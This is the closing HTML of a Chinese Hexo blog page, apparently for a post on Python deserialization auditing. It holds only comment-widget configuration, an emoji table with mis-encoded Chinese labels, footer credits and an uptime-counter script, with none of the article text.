</script></div><div id="disqus_thread"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqusjs.css"><script src="https://cdn.jsdelivr.net/npm/disqusjs@latest/dist/disqus.js"></script><script>const disqusjsConfig = {"enable":true,"shortname":"yunyoujun","apikey":"ouoGQCaamOKdJgyZU5DKcpFnRIg3SNzvk0nwygPtlcTRJuE68c8igvrZGW4wAJoN"}
function loadDisqus() {
  const dsqjs = new DisqusJS(disqusjsConfig)
}</script><script src="/js/comments/disqus.js"></script><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"4x0IwQ1sy95mOGQDTO8MYCeA-gzGzoHsz","appKey":"9loqwF3UDklPDHaP9IN2uwN8","placeholder":"å¤§ä½¬æ±‚æŒ‡æ•™&nbsp_(:Ğ·ã€âˆ )_ ï¼ˆå¡«å†™é‚®ç®±å¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥ï½ï¼‰","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"serverURLs":"https://lncld.yunyoujun.cn","requiredFields":["nick","mail"],"emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_äº²äº²":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_å·ç¬‘":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_å†è§":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_å†·æ¼ ":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_å‘æ€’":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_å‘è´¢":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_å¯çˆ±":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_åè¡€":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_å‘†":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_å‘•å":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_å›°":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_åç¬‘":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_å¤§ä½¬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_å¤§å“­":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_å§”å±ˆ":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_å®³ç¾":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_å°´å°¬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_å¾®ç¬‘":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_æ€è€ƒ":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_æƒŠå“":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png","tv_æ‰“è„¸":"56ab10b624063e966bfcb76ea5dc4794d87dfd47.png","tv_æŠ“ç‹‚":"fe31c08edad661d63762b04e17b8d5ae3c71a757.png","tv_æŠ é¼»":"c666f55e88d471e51bbd9fab9bb308110824a6eb.png","tv_æ–œçœ¼ç¬‘":"911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png","tv_æ— å¥ˆ":"ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png","tv_æ™•":"5443c22b4d07fb1907ccc610c8e6db254f2461b7.png","tv_æµæ±—":"cead1c351ab8d79e9f369605beb90148db0fbed3.png","tv_æµæ³ª":"7e71cde7858f0cd50d74b0264aa26db612a8a167.png","tv_æµé¼»è¡€":"c32d39db2737f89b904ca32700d140a9241b0767.png","tv_ç‚¹èµ":"f85c354995bd99e28fc76c869bfe42ba6438eff4.png","tv_ç”Ÿæ°”":"26702dcafdab5e8225b43ffd23c94ac1ff932654.png","tv_ç”Ÿç—…":"8b0ec90e6b86771092a498c54f09fc94621c1900.png","tv_ç–‘é—®":"0793d949b18d7be716078349c202c15ff166f314.png","tv_ç™½çœ¼":"c1d59f439e379ee50eef488bcb5e5378e5044ea4.png","tv_çš±çœ‰":"72ccad6679fea0d14cce648b4d818e09b8ffea2d.png","tv_ç›®çªå£å‘†":"0b8cb81a68de5d5365212c99375e7ace3e7891b7.png","tv_ç¡ç€":"8b196675b53af58264f383c50ad0945048290b33.png","tv_ç¬‘å“­":"1abc628f6d4f4caf9d0e7800878f4697abbc8273.png","tv_è…¼è…†":"89712c0d4af73e67f89e35cbc518420380a7f6f4.png","tv_è‰²":"61822c7e9aae5da76475e7892534545336b23a6f.png","tv_è°ƒä¾ƒ":"4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png","tv_è°ƒçš®":"b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png","tv_é„™è§†":"6e72339f346a692a495b123174b49e4e8e781303.png","tv_é—­å˜´":"c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png","tv_éš¾è¿‡":"87f46748d3f142ebc6586ff58860d0e2fc8263ba.png","tv_é¦‹":"fc7e829b845c43c623c8b490ee3602b7f0e76a31.png","tv_é¬¼è„¸":"0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png","tv_é»‘äººé—®å·":"45821a01f51bc867da9edbaa2e070410819a95b2.png","tv_é¼“æŒ":"1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"},"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/2021/02/24/python-code-audit/python-unserialize/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">greetdawn</a></div><div class="copyright"><span>&copy; 2018 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> ä¸¨Mr.zhangä¸¨</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.4.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.2</span></div><div class="live_time"><span>æœ¬åšå®¢å·²èŒèŒå“’åœ°è¿è¡Œ</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2019-04-12T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>